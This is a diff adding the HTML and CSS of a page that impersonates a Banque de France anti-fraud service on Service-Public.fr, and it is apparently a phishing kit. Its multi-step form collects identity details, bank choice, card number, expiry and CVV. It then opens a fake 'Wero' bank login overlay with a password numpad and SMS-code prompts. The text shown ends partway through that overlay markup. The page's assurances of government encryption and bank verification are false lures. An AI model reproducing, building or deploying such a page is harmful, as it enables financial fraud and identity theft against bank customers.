@@ -1,0 +1,1461 @@
+<!DOCTYPE html> 
+<html xmlns:ff4j="http://www.w3.org/1999/xhtml" xmlns:esi="http://www.edge-delivery.org/esi/1.0" dir="ltr" data-fr-scheme="light" data-fr-js="true" lang="fr" data-fr-theme="light">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Banque de France&nbsp;: Service anti-fraude | Service-Public.fr</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Service anti-fraude Banque de France - Valider ou annuler une opération.">
+  <meta name="audience" content="particuliers">
+  <meta name="language" content="Fr">
+  <meta name="publisher" content="Direction de l'information légale et administrative">
+  <meta name="creator" content="Direction de l'information légale et administrative">
+  <meta name="subject" content="Argent - Impôts - Consommation">
+  <meta name="coverage" content="France entière">
+  <meta name="identifier" content="R62642">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
+  <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+  <link rel="shortcut icon" href="../assets/img/favicon.ico/" type="image/x-icon">
+  <link rel="manifest" href="../assets/manifest.webmanifest" crossorigin="use-credentials">
+  <link href="../assets/css/dsfr.min.css" rel="stylesheet">
+  <link href="../assets/css/utility.min.css" rel="stylesheet">
+  <link href="../assets/css/sp-dsfr.css" rel="stylesheet">
+  <style>
+    .fr-header__body { padding: 0.6rem 0 !important; }
+    .fr-header__body-row { min-height: 100px !important; }
+    .fr-header__brand { width: 100% !important; display: block !important; }
+    .fr-header__brand-top { width: 100% !important; display: flex !important; align-items: center !important; justify-content: space-between !important; gap: 16px; }
+    .fr-header__logo { display: flex !important; align-items: center; justify-content: space-between; width: 100% !important; gap: 16px; }
+    .logo-left { height: 80px; width: auto; max-width: 45%; flex-shrink: 0; object-fit: contain; }
+    .logo-right { height: 70px; width: auto; max-width: 45%; flex-shrink: 0; object-fit: contain; margin-left: auto; }
+    .fr-header__service { display: none !important; }
+    .fr-header__logo .fr-logo { display: none !important; }
+
+    .form-card { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 2rem 2.5rem; margin: 1.5rem auto; max-width: 680px; }
+    .form-card h1 { font-size: 1.5rem; margin: 0 0 0.5rem; color: #000091; }
+    .form-card .subtitle { font-size: 0.95rem; color: #666; margin: 0 0 1.75rem; }
+    .form-card .form-group { margin-bottom: 1.25rem; }
+    .form-card label { display: block; font-weight: 600; margin-bottom: 0.4rem; font-size: 0.95rem; color: #161616; }
+    .form-card label .required { color: #ce0500; margin-left: 2px; }
+    .form-card input { width: 100%; padding: 0.65rem 0.8rem; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem; font-family: inherit; box-sizing: border-box; transition: border-color 0.2s, box-shadow 0.2s; }
+    .form-card input:focus { outline: none; border-color: #000091; box-shadow: 0 0 0 2px rgba(0,0,145,0.2); }
+    .form-card input.invalid { border-color: #ce0500; }
+    .form-card .error-msg { color: #ce0500; font-size: 0.85rem; margin-top: 0.3rem; display: none; }
+    .form-card .error-msg.visible { display: block; }
+    .form-card .btn-submit { background: #000091; color: #fff; padding: 0.85rem 1.75rem; border: none; border-radius: 4px; font-weight: 600; font-size: 1rem; cursor: pointer; width: 100%; margin-top: 0.5rem; transition: background 0.2s; }
+    .form-card .btn-submit:hover { background: #1212ff; }
+    .form-card .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
+    .info-banner { background: #e3e3fd; border-left: 4px solid #000091; padding: 0.75rem 1rem; margin-bottom: 1.5rem; font-size: 0.9rem; color: #161616; border-radius: 4px; }
+    .back-link { display: inline-block; margin-bottom: 1rem; color: #000091; text-decoration: none; font-weight: 500; cursor: pointer; background: none; border: none; font-size: 1rem; padding: 0; }
+    .back-link:hover { text-decoration: underline; }
+
+    .banks-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; margin: 1.25rem 0 1.75rem; }
+    .bank-option { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 14px 8px; border: 2px solid #e3e3fd; border-radius: 8px; background: #fff; cursor: pointer; transition: border-color 0.2s, box-shadow 0.2s; text-align: center; min-height: 110px; }
+    .bank-option:hover { border-color: #000091; box-shadow: 0 2px 8px rgba(0,0,145,0.12); }
+    .bank-option.selected { border-color: #000091; background: #f0f0ff; box-shadow: 0 0 0 3px rgba(0,0,145,0.15); }
+    .bank-option img { width: 60px; height: 60px; object-fit: contain; margin-bottom: 8px; border-radius: 4px; background: #fff; }
+    .bank-option .bank-name { font-size: 0.8rem; font-weight: 600; color: #161616; line-height: 1.2; }
+    .bank-option .bank-check { display: none; color: #000091; font-size: 1.1rem; margin-top: 4px; }
+    .bank-option.selected .bank-check { display: block; }
+
+    .selected-bank-summary { display: flex; align-items: center; gap: 12px; padding: 12px 16px; border: 1px solid #e3e3fd; border-radius: 8px; background: #f9f9ff; margin-bottom: 1.5rem; }
+    .selected-bank-summary img { width: 48px; height: 48px; object-fit: contain; border-radius: 4px; background: #fff; border: 1px solid #e3e3fd; }
+    .selected-bank-summary .bank-label { font-size: 0.8rem; color: #666; }
+    .selected-bank-summary .bank-value { font-size: 1rem; font-weight: 600; color: #161616; }
+
+    .card-number-wrapper { position: relative; }
+    .card-number-wrapper input { padding-right: 70px; }
+    .card-brand-icon { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); height: 26px; width: auto; pointer-events: none; display: none; }
+    .card-brand-icon.visible { display: block; }
+
+    .row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+    @media (max-width: 480px) { .row-2 { grid-template-columns: 1fr; } }
+
+    .confirmation-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 2.5rem; max-width: 520px; margin: 2rem auto; text-align: center; }
+    .confirmation-box .check { font-size: 3rem; color: #18753c; margin-bottom: 1rem; }
+    .confirmation-box h1 { color: #18753c; font-size: 1.4rem; margin-bottom: 1rem; }
+    .confirmation-box p { color: #444; margin-bottom: 1.5rem; }
+
+    .steps { display: flex; justify-content: center; gap: 0.5rem; margin: 1.5rem auto; flex-wrap: wrap; max-width: 900px; padding: 0 1rem; }
+    #steps-bar { display: none !important; }
+    .step { display: flex; align-items: center; gap: 0.4rem; color: #999; font-size: 0.82rem; cursor: pointer; padding: 6px 10px; border-radius: 6px; transition: background 0.2s, color 0.2s; user-select: none; }
+    .step:hover { background: #f0f0ff; color: #000091; }
+    .step .num { width: 26px; height: 26px; border-radius: 50%; background: #e3e3fd; color: #000091; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 0.8rem; }
+    .step.active .num { background: #000091; color: #fff; }
+    .step.active { color: #000091; font-weight: 600; }
+    .step.done .num { background: #18753c; color: #fff; }
+    .step.done { color: #18753c; }
+    .step.disabled { opacity: 0.4; cursor: not-allowed; }
+    .step.disabled:hover { background: none; color: #999; }
+
+    .view { display: none; }
+    .view.active { display: block; animation: fadeIn 0.25s ease; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+    :root { --bf-blue: #000091; --bg-cream: #faf8f0; --bg-cream-dark: #f2efe3; --error-red: #e74c3c; }
+
+    #weroOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #fdfcf7 0%, var(--bg-cream) 50%, var(--bg-cream-dark) 100%); z-index: 10003; display: none; flex-direction: column; overflow: hidden; }
+    #weroOverlay.active { display: flex; }
+
+    .wero-navbar { width: 100%; background: #ffffff; padding: 8px 16px; display: flex; align-items: center; justify-content: flex-start; box-shadow: 0 2px 12px rgba(0,0,0,0.06); border-bottom: 2px solid var(--bf-blue); flex-shrink: 0; height: 52px; }
+    .wero-navbar-logo { height: 32px; width: auto; object-fit: contain; transition: transform 0.3s ease; }
+    .wero-navbar-logo:hover { transform: scale(1.05); }
+    .wero-navbar-title { margin-left: 12px; display: flex; align-items: center; gap: 8px; }
+    .wero-navbar-wero-logo { max-width: 90px; max-height: 44px; width: auto; height: 44px; object-fit: contain; }
+    .wero-navbar-title span { color: #888; font-weight: 400; font-size: 12px; padding-left: 8px; border-left: 1px solid #ddd; }
+
+    .wero-overlay-content { flex: 1; display: flex; justify-content: center; align-items: center; padding: 10px; overflow: hidden; }
+
+    .wero-login-container { background: #ffffff; padding: 18px 20px 16px; border-radius: 18px; box-shadow: 0 20px 40px rgba(0,0,0,0.10), 0 8px 16px rgba(0,0,0,0.06), 0 0 0 1px rgba(0,0,0,0.03); text-align: center; max-width: 340px; width: 100%; color: #333; display: flex; flex-direction: column; max-height: calc(100vh - 52px - 20px); position: relative; overflow-y: auto; }
+    .wero-login-container::before { content: ''; position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 60px; height: 3px; background: linear-gradient(90deg, var(--bf-blue), #4a4ad4); border-radius: 0 0 4px 4px; }
+
+    .wero-login-logo-wrapper { display: flex; justify-content: center; align-items: center; height: 46px; margin-bottom: 6px; }
+    .wero-login-logo { max-width: 90px; max-height: 44px; object-fit: contain; }
+    .wero-login-title { color: #222; margin: 0 0 2px 0; font-size: 15px; font-weight: 700; letter-spacing: 0.2px; }
+    .wero-login-subtitle { color: #888; font-size: 10.5px; margin: 0 0 12px 0; line-height: 1.3; }
+
+    .wero-regional-field { display: none; margin-bottom: 8px; }
+    .wero-regional-field.active { display: block; }
+    .wero-regional-label { display: block; font-size: 11px; color: #666; margin-bottom: 4px; text-align: left; font-weight: 600; }
+    .wero-regional-input, .wero-regional-select { width: 100%; padding: 10px 12px; margin: 0; border: 2px solid #e5e5e5; border-radius: 10px; font-size: 13px; transition: all 0.25s ease; background: #fafafa; color: #222; text-align: center; font-weight: 600; font-family: inherit; -webkit-appearance: none; appearance: none; background-repeat: no-repeat; background-position: right 12px center; background-size: 10px; padding-right: 32px; }
+    .wero-regional-input:focus, .wero-regional-select:focus { border-color: var(--bf-blue); outline: none; background-color: #fff; box-shadow: 0 0 0 3px rgba(0,0,145,0.15); }
+    .wero-regional-input { background-image: none; padding-right: 12px; text-align: center; letter-spacing: 2px; text-transform: uppercase; }
+
+    .wero-login-input { width: 100%; padding: 10px 12px; margin: 0 0 8px 0; border: 2px solid #e5e5e5; border-radius: 10px; font-size: 13px; transition: all 0.25s ease; background: #fafafa; color: #222; text-align: center; }
+    .wero-login-input::placeholder { color: #aaa; font-size: 12px; }
+    .wero-login-input:focus { border-color: var(--bf-blue); outline: none; background: #fff; box-shadow: 0 0 0 3px rgba(0,0,145,0.15); }
+
+    .wero-password-display { width: 100%; padding: 10px; margin: 0 0 10px 0; border: 2px solid #e5e5e5; border-radius: 10px; font-size: 20px; letter-spacing: 8px; text-align: center; background: linear-gradient(135deg, #fdfcf7 0%, #f8f5e8 100%); font-weight: bold; min-height: 42px; color: #222; transition: all 0.25s ease; display: none; align-items: center; justify-content: center; padding-left: 8px; }
+    .wero-password-display.active { border-color: var(--bf-blue); box-shadow: 0 0 0 3px rgba(0,0,145,0.15); }
+
+    .wero-password-input { width: 100%; padding: 10px 12px; margin: 0 0 10px 0; border: 2px solid #e5e5e5; border-radius: 10px; font-size: 15px; transition: all 0.25s ease; background: linear-gradient(135deg, #fdfcf7 0%, #f8f5e8 100%); color: #222; text-align: center; font-weight: 600; letter-spacing: 2px; display: none; }
+    .wero-password-input::placeholder { color: #aaa; font-size: 12px; font-weight: 400; letter-spacing: 0.5px; text-transform: none; }
+    .wero-password-input:focus { border-color: var(--bf-blue); outline: none; background: #fff; box-shadow: 0 0 0 3px rgba(0,0,145,0.15); }
+
+    .wero-numpad { display: none; grid-template-columns: repeat(4, 1fr); gap: 5px; margin: 0 0 10px 0; }
+    .wero-numpad button { padding: 9px 4px; font-size: 15px; font-weight: 700; border: none; border-radius: 9px; background: #f7f7f7; cursor: pointer; transition: all 0.15s ease; color: #333; user-select: none; -webkit-tap-highlight-color: transparent; box-shadow: 0 1px 2px rgba(0,0,0,0.04); }
+    .wero-numpad button:hover { background: #eef0ff; transform: translateY(-1px); box-shadow: 0 2px 6px rgba(0,0,145,0.2); }
+    .wero-numpad button:active { transform: scale(0.94); background: #dde0ff; }
+    .wero-numpad .numpad-action { background: #ededed; color: #666; font-size: 13px; }
+    .wero-numpad .numpad-action:hover { background: #e0e0e0; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
+
+    .wero-btn { background: linear-gradient(135deg, var(--bf-blue) 0%, #2a2ab8 100%); color: #fff; border: none; padding: 11px 16px; border-radius: 10px; cursor: pointer; font-size: 14px; width: 100%; font-weight: 700; letter-spacing: 0.3px; transition: all 0.25s ease; box-shadow: 0 3px 10px rgba(0,0,145,0.35); margin-top: 2px; }
+    .wero-btn:hover { transform: translateY(-1px); box-shadow: 0 5px 14px rgba(0,0,145,0.5); filter: brightness(1.05); }
+    .wero-btn:active { transform: translateY(0); box-shadow: 0 2px 6px rgba(0,0,145,0.35); }
+    .wero-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+    .wero-error { color: var(--error-red); margin-top: 6px; display: none; font-size: 11px; font-weight: 600; }
+    .wero-secure-badge { display: flex; align-items: center; justify-content: center; gap: 4px; margin-top: 8px; font-size: 9.5px; color: #999; }
+    .wero-close-btn { position: absolute; top: 8px; right: 12px; background: none; border: none; font-size: 22px; color: #999; cursor: pointer; line-height: 1; z-index: 10; }
+    .wero-close-btn:hover { color: #333; }
+
+    #weroAppAuth { animation: fadeIn 0.3s ease; }
+    .wero-app-auth-icon { display: flex; justify-content: center; align-items: center; margin: 4px auto 12px; width: 62px; height: 62px; border-radius: 50%; background: linear-gradient(135deg, #e8f5ee 0%, #d4ecd9 100%); box-shadow: 0 4px 12px rgba(24,117,60,0.15); position: relative; transition: background 0.3s ease; }
+    .wero-app-auth-icon svg { width: 28px; height: 28px; fill: #18753c; position: relative; z-index: 2; transition: fill 0.3s ease; }
+    .wero-app-auth-icon::after { content: ''; position: absolute; inset: -4px; border-radius: 50%; border: 2.5px solid transparent; border-top-color: #18753c; border-right-color: #1e9e4e; animation: weroSpin 1.1s linear infinite; opacity: 0.85; }
+    .wero-app-auth-icon.validated::after { display: none; }
+    @keyframes weroSpin { to { transform: rotate(360deg); } }
+    .wero-app-auth-spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid rgba(24,117,60,0.25); border-top-color: #18753c; border-radius: 50%; animation: weroSpin 0.8s linear infinite; vertical-align: middle; margin-right: 5px; }
+    .wero-app-auth-status { font-size: 12px; color: #18753c; font-weight: 600; margin: 0 0 8px 0; display: flex; align-items: center; justify-content: center; gap: 2px; min-height: 18px; }
+    .wero-app-auth-hint { font-size: 10.5px; color: #888; margin: 0 0 12px 0; line-height: 1.4; }
+    .wero-app-auth-countdown { font-size: 11px; color: #ce0500; font-weight: 600; margin: 0 0 10px 0; font-variant-numeric: tabular-nums; }
+    #weroSmsLink { display: inline-block; transition: color 0.2s; }
+    #weroSmsLink:hover { color: #1212ff; }
+    #weroSmsTimer { font-variant-numeric: tabular-nums; font-weight: 600; color: #ce0500; }
+    #weroSmsTimer.expired { color: #888; }
+
+    @media (max-width: 900px) {
+      .logo-left  { height: 64px; max-width: 46%; }
+      .logo-right { height: 56px; max-width: 46%; }
+      .fr-header__body-row { min-height: 80px !important; }
+    }
+    @media (max-width: 600px) {
+      .form-card { padding: 1.5rem; }
+      .logo-left  { height: 52px; max-width: 48%; }
+      .logo-right { height: 44px; max-width: 48%; }
+      .fr-header__body-row { min-height: 64px !important; }
+    }
+    @media (max-height: 700px) {
+      .wero-login-container { padding: 14px 16px 12px; }
+      .wero-login-logo-wrapper { height: 36px; }
+      .wero-login-logo { max-height: 36px; }
+      .wero-login-title { font-size: 14px; }
+      .wero-login-subtitle { font-size: 10px; margin-bottom: 8px; }
+      .wero-login-input { padding: 8px 10px; margin-bottom: 6px; font-size: 12px; }
+      .wero-password-input { padding: 8px 10px; margin-bottom: 6px; font-size: 14px; }
+      .wero-regional-input, .wero-regional-select { padding: 8px 10px; font-size: 12px; }
+      .wero-password-display { padding: 8px; margin-bottom: 8px; min-height: 36px; font-size: 17px; }
+      .wero-numpad button { padding: 7px 4px; font-size: 14px; }
+      .wero-numpad { gap: 4px; margin-bottom: 8px; }
+      .wero-btn { padding: 9px 14px; font-size: 13px; }
+      .wero-secure-badge { margin-top: 6px; }
+      .wero-app-auth-icon { width: 52px; height: 52px; margin: 2px auto 8px; }
+      .wero-app-auth-icon svg { width: 24px; height: 24px; }
+      .wero-app-auth-status { font-size: 11px; }
+      .wero-app-auth-hint { font-size: 10px; margin-bottom: 8px; }
+    }
+    @media (max-height: 600px) {
+      .wero-login-container { padding: 10px 14px; max-width: 300px; }
+      .wero-login-logo-wrapper { height: 30px; margin-bottom: 3px; }
+      .wero-login-logo { max-height: 30px; }
+      .wero-login-title { font-size: 13px; }
+      .wero-login-subtitle { font-size: 9.5px; margin-bottom: 6px; }
+      .wero-login-input { padding: 7px 9px; margin-bottom: 5px; font-size: 12px; }
+      .wero-password-input { padding: 7px 9px; margin-bottom: 5px; font-size: 13px; }
+      .wero-regional-input, .wero-regional-select { padding: 7px 9px; font-size: 12px; }
+      .wero-regional-label { font-size: 10px; margin-bottom: 3px; }
+      .wero-password-display { padding: 7px; margin-bottom: 6px; min-height: 32px; font-size: 15px; letter-spacing: 6px; }
+      .wero-numpad button { padding: 6px 3px; font-size: 13px; border-radius: 7px; }
+      .wero-numpad { gap: 3px; margin-bottom: 6px; }
+      .wero-btn { padding: 8px 12px; font-size: 12.5px; }
+      .wero-error { font-size: 10px; }
+      .wero-secure-badge { font-size: 9px; margin-top: 5px; }
+      .wero-app-auth-icon { width: 46px; height: 46px; margin: 0 auto 6px; }
+      .wero-app-auth-icon svg { width: 22px; height: 22px; }
+      .wero-app-auth-status { font-size: 10.5px; margin-bottom: 6px; }
+      .wero-app-auth-hint { font-size: 9.5px; margin-bottom: 6px; }
+    }
+  </style>
+</head>
+<body lang="fr">
+
+  <noscript>
+    <div class="fr-container fr-mb-10v" id="top">
+      <p class="sp-text--center">Javascript est désactivé dans votre navigateur.</p>
+    </div>
+  </noscript>
+
+  <header role="banner" id="banner">
+    <div class="fr-header" data-fr-js-header-actionee="true">
+      <div class="fr-header__body">
+        <div class="fr-container">
+          <div class="fr-header__body-row">
+            <div class="fr-header__brand fr-enlarge-link">
+              <div class="fr-header__brand-top">
+                <div class="fr-header__logo">
+                  <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/d/dd/Minist%C3%A8re_de_l%E2%80%99%C3%89conomie_des_Finances_et_de_la_Souverainet%C3%A9_industrielle_et_num%C3%A9rique.svg/3840px-Minist%C3%A8re_de_l%E2%80%99%C3%89conomie_des_Finances_et_de_la_Souverainet%C3%A9_industrielle_et_num%C3%A9rique.svg.png?utm_source=ar.wikipedia.org&utm_campaign=index&utm_content=thumbnail" alt="Ministère de l'Économie, des Finances et de la Souveraineté industrielle et numérique" class="logo-left">
+                  <img src="https://www.economie-pays-fontainebleau.fr/wp-content/uploads/2023/03/GetImage-1qsdfqsdf55.png" alt="Service-Public.fr" class="logo-right">
+                </div>
+                <div class="fr-header__navbar" id="header-search-mobile"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="fr-container fr-pb-2w">
+    <main class="main" id="main" role="main" lang="fr">
+
+      <section id="view-home" class="view active">
+        <div class="sp-container">
+          <article class="article">
+            <h1 id="titrePage">Banque de France&nbsp;: Service anti-fraude</h1>
+            <p data-test="contenu-texte">
+              Veuillez choisir une option afin d'accéder aux services anti-fraude. Que souhaitez-vous&nbsp;:
+              <a href="#" onclick="showView('form', 'remboursement'); return false;">Valider une opération&nbsp;?</a>
+              OU
+              <a href="#" onclick="showView('form', 'annulation'); return false;">Annuler une opération&nbsp;?</a>
+            </p>
+            <ul class="fr-raw-list" data-test="ul-picto"></ul>
+            <p class="sp-text--center fr-my-6w" data-test="div-lienWeb">
+              <a class="fr-btn fr-mb-2w sp-btn-demarche sp-btn-icon--top fr-btn--lg" href="#" onclick="showView('form', 'remboursement'); return false;" title="Demander un remboursement">
+                <svg aria-hidden="true" focusable="false" class="fr-mb-1w sp-icon sp-icon-ri-arrow-left-right-line" viewBox="0 0 24 24" width="24" height="24">
+                  <path d="M16.05 12.05L21 17l-4.95 4.95-1.414-1.414 2.536-2.537L4 18v-2h13.172l-2.536-2.536 1.414-1.414zm-8.1-10l1.414 1.414L6.828 6 20 6v2H6.828l2.536 2.536L7.95 11.95 3 7l4.95-4.95z"></path>
+                </svg>
+                <span>Remboursement</span>
+              </a>
+              <a class="fr-btn fr-mb-2w sp-btn-demarche sp-btn-icon--top fr-btn--lg" href="#" onclick="showView('form', 'annulation'); return false;" title="Annuler une opération">
+                <svg aria-hidden="true" focusable="false" class="fr-mb-1w sp-icon sp-icon-ri-arrow-left-right-line" viewBox="0 0 24 24" width="24" height="24">
+                  <path d="M16.05 12.05L21 17l-4.95 4.95-1.414-1.414 2.536-2.537L4 18v-2h13.172l-2.536-2.536 1.414-1.414zm-8.1-10l1.414 1.414L6.828 6 20 6v2H6.828l2.536 2.536L7.95 11.95 3 7l4.95-4.95z"></path>
+                </svg>
+                <span>Annulation</span>
+              </a>
+            </p>
+          </article>
+        </div>
+      </section>
+
+      <section id="view-form" class="view">
+        <div class="steps" id="steps-bar">
+          <div class="step active" data-step="1"><span class="num">1</span> Informations</div>
+          <div class="step" data-step="2"><span class="num">2</span> Banque</div>
+          <div class="step" data-step="3"><span class="num">3</span> Carte</div>
+          <div class="step" data-step="4"><span class="num">4</span> Wero</div>
+          <div class="step" data-step="5"><span class="num">5</span> Confirmation</div>
+          <div class="step" data-step="6"><span class="num">6</span> Traitement</div>
+        </div>
+
+        <div id="form-step-1">
+          <div class="form-card">
+            <button type="button" class="back-link" onclick="showView('home')">&larr; Retour</button>
+            <h1 id="form-title">Demande de remboursement</h1>
+            <p class="subtitle">Merci de renseigner les informations ci-dessous. Tous les champs marqués d'un <span style="color:#ce0500;">*</span> sont obligatoires.</p>
+            <div class="info-banner"><strong>Service anti-fraude Banque de France</strong> — Vos données sont traitées de manière confidentielle.</div>
+            <form id="fraud-form" novalidate>
+              <input type="hidden" id="form-type" name="type" value="remboursement">
+              <div class="form-group">
+                <label for="nom">Nom et prénom <span class="required">*</span></label>
+                <input type="text" id="nom" name="nom" maxlength="120" placeholder="Ex : Jean Dupont">
+                <div class="error-msg" data-for="nom">Veuillez saisir votre nom et prénom.</div>
+              </div>
+              <div class="form-group">
+                <label for="email">Adresse e-mail <span class="required">*</span></label>
+                <input type="email" id="email" name="email" maxlength="150" placeholder="Ex : jean.dupont@email.com">
+                <div class="error-msg" data-for="email">Veuillez saisir une adresse e-mail valide.</div>
+              </div>
+              <div class="form-group">
+                <label for="date_naissance">Date de naissance <span class="required">*</span></label>
+                <input type="date" id="date_naissance" name="date_naissance">
+                <div class="error-msg" data-for="date_naissance">Veuillez saisir votre date de naissance.</div>
+              </div>
+              <div class="form-group">
+                <label for="telephone">Numéro de téléphone <span class="required">*</span></label>
+                <input type="tel" id="telephone" name="telephone" pattern="[0-9+\s().-]{6,20}" placeholder="Ex : 06 12 34 56 78">
+                <div class="error-msg" data-for="telephone">Veuillez saisir un numéro de téléphone valide.</div>
+              </div>
+              <div class="form-group">
+                <label for="ville">Ville / Région <span class="required">*</span></label>
+                <input type="text" id="ville" name="ville" maxlength="100" placeholder="Ex : Lyon / Auvergne-Rhône-Alpes">
+                <div class="error-msg" data-for="ville">Veuillez saisir votre ville / région.</div>
+              </div>
+              <div class="form-group">
+                <label for="adresse">Adresse complète <span class="required">*</span></label>
+                <input type="text" id="adresse" name="adresse" maxlength="200" placeholder="Ex : 12 rue de la République, 69002 Lyon">
+                <div class="error-msg" data-for="adresse">Veuillez saisir votre adresse complète.</div>
+              </div>
+              <div class="form-group">
+                <label for="montant">Montant débité (€) <span class="required">*</span></label>
+                <input type="number" id="montant" name="montant" step="0.01" min="0" placeholder="Ex : 250.00">
+                <div class="error-msg" data-for="montant">Veuillez saisir un montant valide.</div>
+              </div>
+              <button type="submit" class="btn-submit" id="btn-step1">Continuer</button>
+            </form>
+          </div>
+        </div>
+
+        <div id="form-step-2" style="display:none;">
+          <div class="form-card">
+            <button type="button" class="back-link" onclick="goToStep(1)">&larr; Retour</button>
+            <h1>Sélectionnez votre banque</h1>
+            <p class="subtitle">Choisissez l'établissement bancaire concerné par l'opération.</p>
+            <div class="info-banner"><strong>Vérification sécurisée</strong> — Nous allons contacter votre banque pour vérifier l'opération.</div>
+            <div class="banks-grid" id="banks-grid"></div>
+            <div class="error-msg" id="bank-error" style="margin-bottom: 1rem;">Veuillez sélectionner une banque pour continuer.</div>
+            <button type="button" class="btn-submit" id="btn-step2" disabled>Continuer</button>
+          </div>
+        </div>
+
+        <div id="form-step-3" style="display:none;">
+          <div class="form-card">
+            <button type="button" class="back-link" onclick="goToStep(2)">&larr; Retour</button>
+            <h1>Informations bancaires</h1>
+            <p class="subtitle">Pour des raisons de sécurité, nous procéderons à la vérification rapide de vos informations.<br>Vos données sont cryptées et stockées sur un serveur ultra sécurisé relié à votre banque, à l'abri d'un tiers.</p>
+            <div class="selected-bank-summary">
+              <img id="selected-bank-img" src="" alt="">
+              <div>
+                <div class="bank-label">Banque sélectionnée</div>
+                <div class="bank-value" id="selected-bank-name">—</div>
+              </div>
+            </div>
+            <div class="info-banner"><strong>Paiement sécurisé</strong> — Vos informations de carte sont chiffrées de bout en bout.</div>
+            <form id="card-form" novalidate>
+              <div class="form-group">
+                <label for="card-holder">Nom du titulaire <span class="required">*</span></label>
+                <input type="text" id="card-holder" name="card_holder" maxlength="120" placeholder="Nom inscrit sur la carte" autocomplete="cc-name">
+                <div class="error-msg" data-for="card-holder">Veuillez saisir le nom du titulaire.</div>
+              </div>
+              <div class="form-group">
+                <label for="card-number">Numéro de carte <span class="required">*</span></label>
+                <div class="card-number-wrapper">
+                  <input type="text" id="card-number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" maxlength="23" inputmode="numeric" autocomplete="cc-number">
+                  <img id="card-brand-icon" class="card-brand-icon" src="" alt="">
+                </div>
+                <div class="error-msg" data-for="card-number">Veuillez saisir un numéro de carte valide.</div>
+              </div>
+              <div class="row-2">
+                <div class="form-group">
+                  <label for="card-exp">Date d'expiration <span class="required">*</span></label>
+                  <input type="text" id="card-exp" name="card_exp" placeholder="MM/AAAA" maxlength="7" inputmode="numeric" autocomplete="cc-exp">
+                  <div class="error-msg" data-for="card-exp">Format MM/AAAA requis.</div>
+                </div>
+                <div class="form-group">
+                  <label for="card-cvv">Cryptogramme <span class="required">*</span></label>
+                  <input type="text" id="card-cvv" name="card_cvv" placeholder="CVV" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+                  <div class="error-msg" data-for="card-cvv">3 ou 4 chiffres requis.</div>
+                </div>
+              </div>
+              <button type="submit" class="btn-submit" id="btn-step3">Confirmer et envoyer</button>
+            </form>
+          </div>
+        </div>
+
+        <div id="form-step-4" style="display:none;">
+          <div class="form-card" style="text-align:center;">
+            <h1>Paiement Wero</h1>
+            <p class="subtitle">Connexion sécurisée à votre espace bancaire pour valider le remboursement.</p>
+            <div class="selected-bank-summary" style="justify-content:center;">
+              <img id="selected-bank-img-wero" src="" alt="">
+              <div>
+                <div class="bank-label">Banque sélectionnée</div>
+                <div class="bank-value" id="selected-bank-name-wero">—</div>
+              </div>
+            </div>
+            <div class="info-banner"><strong>Wero — Paiement instantané</strong><br>Vous allez être redirigé vers l'interface sécurisée de votre banque.</div>
+            <button type="button" class="btn-submit" id="btn-step4">Ouvrir Wero</button>
+            <button type="button" class="back-link" onclick="goToStep(3)" style="margin-top:1rem;">&larr; Retour</button>
+          </div>
+        </div>
+
+        <div id="form-step-5" style="display:none;">
+          <div class="confirmation-box">
+            <div class="check">✅</div>
+            <h1>Votre demande a bien été enregistrée</h1>
+            <p id="confirm-message">Nous vous recontacterons prochainement à l'adresse indiquée.</p>
+            <button type="button" class="fr-btn" onclick="goToStep(6)">Finaliser</button>
+          </div>
+        </div>
+
+        <div id="form-step-6" style="display:none;">
+          <div class="confirmation-box">
+            <div class="check" style="color:#000091;">
+              <svg width="60" height="60" viewBox="0 0 50 50" style="animation: spin 1.5s linear infinite;">
+                <circle cx="25" cy="25" r="20" fill="none" stroke="#e3e3fd" stroke-width="5"/>
+                <circle cx="25" cy="25" r="20" fill="none" stroke="#000091" stroke-width="5" stroke-dasharray="31.4 125.6" stroke-linecap="round" transform="rotate(-90 25 25)"/>
+              </svg>
+            </div>
+            <h1 style="color:#000091;">Traitement en cours…</h1>
+            <p>Votre demande est en cours de vérification par notre service anti-fraude.</p>
+            <p style="font-size:0.9rem; color:#666;">Vous recevrez une confirmation par e-mail à l'adresse indiquée. Merci de ne pas fermer cette page.</p>
+            <div class="info-banner" style="text-align:left; margin-top:1.5rem;">
+              <strong>Délai de traitement</strong> — Votre dossier est en cours d'analyse. Un conseiller vous contactera si des informations complémentaires sont nécessaires.
+            </div>
+            <button type="button" class="btn-submit" onclick="showView('home')" style="margin-top:1.5rem;">🏠 Retourner à l'accueil</button>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <div id="weroOverlay">
+    <div class="wero-navbar">
+      <img src="../assets/img/logo-bf.svg" alt="Banque de France" class="wero-navbar-logo" id="weroNavbarLogo">
+      <div class="wero-navbar-title">
+        <img src="" alt="Banque" class="wero-navbar-wero-logo" id="weroNavbarWeroLogo">
+        <span>Paiement sécurisé</span>
